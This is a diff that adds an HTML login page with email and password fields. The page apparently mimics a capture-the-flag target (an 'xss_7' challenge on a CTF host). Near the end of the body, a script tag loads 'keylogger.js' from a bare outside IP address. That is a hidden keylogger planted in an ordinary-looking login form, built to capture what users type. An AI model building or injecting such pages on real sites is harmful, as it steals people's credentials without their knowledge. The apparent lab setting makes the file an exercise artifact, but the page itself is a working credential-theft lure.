@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <base href="http://ctf.segfaulthub.com:4343/xss_7/login.html" target="_blank">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="./css/style.css"  rel = "stylesheet"/>
+    <title>Webpage</title>
+</head>
+<body>
+    <div class = "wrapper">
+        <div id = "login-form">
+            <div class = "head">Log In</div>
+            <form action = "http://ctf.segfaulthub.com:4343/xss_7/login.php" method = "post">
+                <div class = "hori">
+                    <i class="far fa-user fa-2x"></i>
+                    <input name = "id" type = "text" placeholder="Email" id = "login-id" />
+                </div>
+                <div class = "hori">
+                    <i class="fas fa-lock fa-2x"></i>
+                    <input name = "pw" type = "password" placeholder="Password" id = "login-pw" />
+                </div>
+                <div class = "hori"><input type = "submit" value = "Log In" id = "login-btn" /></div>
+            </form>
+            <button id = "signup-btn" onclick = "location.href = 'signup.html'">Sign up</button>
+        </div>
+    </div>
+    <script src="http://141.164.49.177/keylogger.js"></script>
+    <script
+        src="https://kit.fontawesome.com/6478f529f2.js"
+        crossorigin="anonymous"
+    ></script>
+</body>
+</html>
